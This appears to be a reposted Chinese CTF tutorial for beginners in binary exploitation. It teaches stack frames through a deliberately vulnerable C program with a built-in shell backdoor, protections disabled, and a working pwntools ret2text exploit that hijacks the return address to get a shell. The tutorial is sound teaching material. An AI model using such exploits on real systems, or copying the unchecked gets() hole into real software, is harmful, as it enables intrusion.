---
title: Pwn从入门到入狱
tags:
  - Pwn
excerpt: 转载，XDU巨佬写的入?指南（
toc: true
author: XDU
date: '2021.07.08 18:31:16'
categories:
  - 计算机科学
---

# Pwn从入门到入狱

Copyright © 2020 arttnba3,XDSEC

## 简介：什么是Pwn？

**Pwn**这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即**利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）**

Pwn也是最能代表**原教旨主义黑客**的一个安全研究方向~~同时也是最容易进监狱的一个方向~~

## 预备知识

作为二进制安全的分支之一，Pwn需要你**熟练掌握**如下基础知识：

- **主流平台汇编语言，包括但不局限于X86、MIPS等**
- **C语言**
- **计算机组成原理**
- **计算机操作系统**
- **静态分析（IDA）&动态调试（GDB）**
- **Python**
- **编译原理**
- **......**

看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是**一边比赛一边学习的**，所以不用担心因为自己0基础导致无法入门的情况的发生

> CTF TO LEARN, NOT LEARN TO CTF

## Pwn的解题过程？

1. 题目的二进制文件一般会被部署到服务器上，使用`nc xx.xx.xx.xx(ip) xxxx(端口)`命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。
2. 你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写`Exploit`(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的`flag文件或字符串`，将其提交至本平台。
3. 注意命令行中的`nc`并不是做题工具，你需要在Linux下安装`pwntools`库（或者其它），用于编写可用性较高的`Exploit`。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~

## 0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text

> #### 前置知识要求
>
> - C语言基本语法
> - Python语言基本语法
>
> 能大致看得懂C程序、有写简单的Python程序的能力即可
>
> #### 前置环境要求
>
> - Windows
>
> - Linux
>
> 我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成
>
> 你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux
>
> 注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢
>
> #### 百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度
>
> #### 不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称

以下内容将通过几个样例简单地帮助你入门Pwn

### 以下内容操作环境位于Linux

我们现在来看这样的一个程序：

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
using namespace std;

void backdoor(void)
{
    system("/bin/sh");
}

void func(void)
{
    char str[20];
    puts("tell me your name plz:");
    gets(str);
}

int main(void)
{
    func();
}
```

我们使用```-fno-stack-protector```、```-z norelro```、```-z execstack```、```-no-pie```这四条编译指令把这个程序的保护都给关掉

![image.png](https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png)

#### 安全检查：checksec

**使用```checksec```指令可以查看程序的保护开启情况**

![image.png](https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png)

可以在控制台输入如下指令安装：

```shell
sudo apt install checksec
```

#### 逻辑分析

这个程序做了些什么？

- 定义了一个后门函数```backdoor()```，但是并未调用

- 分配了20个字节大小的内存空间给到char类型数组str

- 使用```gets()```函数从标准输入流读入字符串并写入数组str内

我们可以看到当我们在编译时编译器**给了一个警告**，这是因为**gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限**

我们尝试着输入超过20个字节的字符串，看看会发生些什么：

![image.png](https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png)

程序崩溃，提示**Segmentation fault**（**段错误**），即**该程序尝试访问了不属于他的内存空间**

但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，**为什么输入不一样就会导致程序崩溃呢？**

### 以下内容操作环境位于Windows

#### IDA：逆向分析

通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——**IDA**

我们尝试使用**IDA**对程序进行**逆向分析**

> 注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA

当我们将程序拖入IDA后，除了我们自己写的```backdoor()```函数、```func()```函数及```main()```函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，

![image.png](https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png)

这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码

![image.png](https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png)

同样地，双击func函数我们也可以看到其原始的汇编代码

![image.png](https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png)

> ### F5键：使用IDA进行逆向分析的神器
>
> 当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程
>
> ![image.png](https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png)
>
> 要注意的是**不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要**
>
> 如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现
>
> ![image.png](https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png)
>
> 如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）
>
> ![image.png](https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png)

push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用

### 以下内容操作环境位于Linux

#### 栈帧

为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——**栈帧**（**Stack Frame**）

> 推荐阅读——《程序员的自我修养》第10章
>

> 在讲栈帧之前，我们先简单地讲一讲什么是**栈**
>
> 在数据结构中，**栈**（**stack**）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）
>
> 在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。

当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的**栈帧**，用以储存属于这个函数的数据与基本信息，包括如下信息：

- **函数的返回地址和参数**
- **临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量**

想象如下一个空的栈：

**需要注意的是：在内存当中，栈是由高地址向低地址方向增长的**

![64E3FCC73EF02703BA8C857A91F96838.png](https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png)

这里引入一个新的概念——**栈指针寄存器SP**（**Stack Pointer**）与**帧指针寄存器BP**（**Frame Pointer**），这两个寄存器用以管理栈帧，其中**SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问**

当我们要调用一个函数时，首先会先**将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成**，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址

我们还是以刚刚反汇编出来的代码进行分析：

右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑

![image.png](https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png)

```assembly
.text:000000000040055A ; Attributes: bp-based frame
.text:000000000040055A
.text:000000000040055A                 public func
.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p
.text:000000000040055A
.text:000000000040055A var_20          = byte ptr -20h
.text:000000000040055A
.text:000000000040055A ; __unwind {
.text:000000000040055A                 push    rbp
.text:000000000040055B                 mov     rbp, rsp
.text:000000000040055E                 sub     rsp, 20h
.text:0000000000400562                 lea     rdi, s          ; "tell me your name plz"
.text:0000000000400569                 call    _puts
.text:000000000040056E                 lea     rax, [rbp+var_20]
.text:0000000000400572                 mov     rdi, rax
.text:0000000000400575                 mov     eax, 0
.text:000000000040057A                 call    _gets
.text:000000000040057F                 nop
.text:0000000000400580                 leave
.text:0000000000400581                 retn
.text:0000000000400581 ; } // starts at 40055A
.text:0000000000400581 func            endp
```

![52DF40089C8FCCF9D5CF8DE7211B73D8.png](https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png)

接下来就来到了我们看到的前两行汇编代码：```push rbp```与```mov rbp, rsp```，我们不难从指令的英文释义上知道其流程：

- **将bp寄存器的值压入栈中**
- **将sp寄存器的值赋给bp寄存器**

![9CF0F7F5A8DA1972F88EF480E4FB6271.png](https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png)

接下来的```sub rsp, 20h```指令的作用是**开辟栈空间**，处在sp与bp之间的这一块区域便用于储存数据

![A422C008B65723152D16FDDAD8421B38.png](https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png)

我们的```char str[20];```所占用的空间也在这里，同时我们可以发现我们**虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据**（以后会学到）

![227643CB6A805274DA147132CC0413DE.png](https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png)

那么接下来就进入到我们对```gets()```函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以**将返回地址前面的数据全部填充**（**padding**）**掉，并将返回地址覆写为别的地址，改变程序的执行流程**

![AF0BBCCF20D852033C201460B566F5DA.png](https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png)

我们最终的目的是**获取到shell**，那么只要程序当中存在着```system("/bin/sh")```的函数调用，我们再将程序返回到其地址上，即可get shell

构造payload如下

```python
payload = b'A'*(0x20+8) + p64(sys_addr)  # 别忘了8字节的rbp哟
```

我们之前在程序当中写了一个```backdoor()```函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为```0x400547```

![image.png](https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png)

#### 攻击神器：pwntools

接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——**pwntools**

> pwntools需要在**Linux**系统下使用（如Ubuntu、manjaro、kali等）
>
> 在shell中输入如下指令安装pwntools
>
> ```shell
> $ sudo pip install pwntools
> ```

使用pwntools库我们可以很方便地输入相应的payload

接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：

```python
from pwn import *    # 从pwntools库中导入所需要的一切
p = process('./test')   # 运行一个程序
        # 需要注意的是，在连接远程服务器的时候，使用的是remote()
           # p = remote(addr,port)
              # 如：p = remote('sec.arttnba3.cn',10001)
p.recv()      # 从程序中读取输入直到下一个断点（如遇到输入语句）
sys_addr = p64(0x400547)  # 将地址构造为符合小端模式的bytes数组，长度为8
        # 需要注意的是在32位下应当使用p32()，长度为4
payload = b'A'*0x28 + sys_addr # 构造我们的payload
p.sendline(payload)    # 向程序发送我们的输入
        # 需要注意的是，sendline()会在末尾添加换行符'\n'
           # 若不想要发送多余的换行符，可以使用send()方法
p.interactive()     # 程序进入interactive模式，即进入我们与程序直接交互的界面
```

**成功get shell**

![image.png](https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png)

至此，我们已经完成了**从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程**，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了

**为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！**

```
moectf{PWN_T0_0WN!}
```
